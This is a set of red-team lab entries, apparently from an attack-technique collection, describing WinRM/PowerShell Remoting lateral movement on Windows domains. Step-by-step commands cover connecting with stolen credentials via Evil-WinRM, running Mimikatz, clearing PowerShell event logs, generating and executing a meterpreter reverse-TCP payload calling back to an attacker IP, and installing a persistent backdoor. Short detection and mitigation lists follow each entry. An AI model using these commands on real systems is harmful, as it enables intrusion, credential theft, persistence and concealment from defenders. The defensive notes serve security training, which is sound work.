- **Tools**: 👉 Kali Linux👉 2+ Windows domain-joined machines👉 PowerShell v5+ (built-in)👉 Evil-WinRM (optional)👉 BloodHound / PowerView
- **Scenario**: This attack demonstrates how PowerShell Remoting, a legitimate Windows feature (WinRM), can be abused to execute commands on remote domain-joined Windows systems without needing to drop any binaries. Attackers often use this method during lateral movement, especially post-credential theft. If WinRM is enabled and the attacker has valid credentials, they can remotely execute commands over HTTP(S), fully fileless.
- **Attack Steps**: 🔸 STEP 1: Setup the Lab• One Windows Domain Controller (DC01)• Two Windows 10/11 machines (PC1, PC2) in the domain• Enable WinRM on all (if not already):Enable-PSRemoting -Force• Kali Linux or ParrotOS as attacker box (on same subnet)🔸 STEP 2: Obtain Valid Credentials• From phishing, hash dump (e.g., Mimikatz), or password reuse• Format: username + password or NTLM hash🔸 STEP 3: Confirm Target is Reachable and WinRM is EnabledFrom attacker:nmap -p 5985,5986 <target-IP>Should show WinRM (HTTP:5985, HTTPS:5986)🔸 STEP 4: Connect Using Native PowerShell (Windows)On attacker machine (with valid creds):Enter-PSSession -ComputerName 192.168.56.102 -Credential domain\admin✅ You get a remote PS prompt: [192.168.56.102]: PS C:\Users\Admin>🔸 STEP 5: Connect Using Evil-WinRM (Linux)bash<br>evil-winrm -i 192.168.56.102 -u Administrator -p 'P@ssword123'<br>✅ Full shell over WinRM (supports upload/download, scripts, etc.)🔸 STEP 6: Execute Post-Exploitation Commandswhoami /allGet-LocalGroupMember administratorsnetstat -anoInvoke-Mimikatz (if loaded)🔸 STEP 7: Lateral Movement to Another HostRepeat above with another host:Enter-PSSession -ComputerName PC2 -Credential domain\admin• Or use: Invoke-Command -ComputerName PC2 -ScriptBlock { ipconfig /all }🔸 STEP 8: Clean Up Logs (optional)PowerShell Remoting logs heavily in:Applications and Services Logs > Microsoft > Windows > PowerShell/OperationalUse log cleaner or clear manually:Clear-EventLog -LogName PowerShell🧠 Tips:• WinRM is enabled by default on Server OS (but not desktops)• Encrypted by default on HTTPS/port 5986• Works well with proxychains in red teaming• Supports fileless attack chains (great for EDR evasion)📈 Note: This is a common step in red team operations or APT-style lateral movement.
- **Detection**: • Review PowerShell logs• Monitor 5985/5986 traffic• Correlate logon + remote execution events• Use SIEM to detect unusual PSRemoting patterns
- **Solution**: • Restrict WinRM access via GPO / IP ACLs• Disable for non-admin users• Use Just Enough Admin (JEA)• Enforce full script-block logging• Implement strong EDR rules
- **Tags**: #PowerShellRemoting #WinRM #RemoteExec #RedTeam #LateralMovement #Fileless #EvilWinRM

- **Attack Steps**: ### 🔺 STEP 1: Setup Lab Environment• Ensure WinRM is enabled on the target system:Enable-PSRemoting -Force• Create a low-privileged or admin user with a known password for testing (e.g., attacker:Pass123)• Ensure firewall allows TCP port 5985 (HTTP WinRM) and/or 5986 (HTTPS)• Confirm Kali and Windows are on the same network.---### 🔺 STEP 2: Generate a Payload (Backdoor EXE)On Kali:msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Your-IP> LPORT=4444 -f exe -o shell.exe✅ This generates a Windows EXE file that connects back to your Metasploit handler.---### 🔺 STEP 3: Setup Reverse ListenerStart Metasploit:msfconsoleuse exploit/multi/handlerset PAYLOAD windows/x64/meterpreter/reverse_tcpset LHOST <Your-IP>set LPORT 4444run✅ This will listen for incoming connections.---### 🔺 STEP 4: Drop and Execute the PayloadUse Evil-WinRM to upload and run it:evil-winrm -i <Target-IP> -u attacker -p Pass123In the shell:upload shell.exe./shell.exe✅ The payload is now running, and a session should open in Metasploit.---### 🔺 STEP 5: Maintain Access (Optional)Within meterpreter:persistence -X -i 30 -p 4444 -r <Your-IP>✅ This installs a persistent backdoor that runs every reboot.---### 🔺 STEP 6: Cleanup (Ethical Use)• Remove shell.exe• Remove persistence using:run persistence -r• Reboot the machine• Reset user password if used shared creds🕵️ Pro Tips:• Use winpeas or PowerUp after access for local privesc• This method is stealthier if port 5985 is open internally• Works in enterprise if WinRM + weak creds + no monitoring⚡ Forensics:• Monitor Microsoft-Windows-WinRM/Operational event log• Look for evil-winrm.exe in PowerShell logs• Network logs for traffic to attacker IP
- **Detection**: • Monitor WinRM logs• Alert on EXE transfers• Analyze PowerShell logs• IDS alerts for beaconing traffic to attacker
- **Solution**: • Restrict WinRM to trusted IPs• Disable WinRM if unused• Use strong passwords & rotate creds• Deploy EDR to detect evil-winrm use• Segment network + logging
- **Tags**: #WinRMAbuse #Backdoor #PayloadDrop #RemoteExec #EvilWinRM #RedTeam #RCE #OSExploit #WindowsLateral #Meterpreter #Persistence

- **Solution**: • Restrict DA usage to jump hosts• Disable WinRM unless needed• Enforce LAPS and password rotation• Apply host segmentation (no flat trust)• PowerShell ScriptBlock and Transcription Logging• Apply Just-Enough-Administration (JEA)
